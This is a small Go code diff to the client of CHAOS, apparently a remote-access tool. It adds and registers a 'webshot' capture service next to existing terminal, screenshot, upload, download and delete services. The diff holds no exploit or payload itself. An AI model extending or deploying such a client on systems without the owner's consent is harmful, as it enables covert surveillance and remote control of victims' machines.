@@ -13,6 +13,7 @@ import (
 	"github.com/justadoll/CHAOS/client/app/services/information"
 	"github.com/justadoll/CHAOS/client/app/services/os"
 	"github.com/justadoll/CHAOS/client/app/services/screenshot"
+	"github.com/justadoll/CHAOS/client/app/services/webshot"
 	"github.com/justadoll/CHAOS/client/app/services/terminal"
 	"github.com/justadoll/CHAOS/client/app/services/upload"
 	"github.com/justadoll/CHAOS/client/app/services/url"
@@ -34,6 +35,7 @@ func NewApp(httpClient *http.Client, configuration *environment.Configuration) *
 		Information: informationService,
 		Terminal:    terminalService,
 		Screenshot:  screenshot.NewScreenshotService(),
+		Webshot:	 webshot.NewScreenshotService(),
 		Download:    download.NewDownloadService(configuration, clientGateway),
 		Upload:      upload.NewUploadService(configuration, httpClient),
 		Delete:      delete.NewDeleteService(),
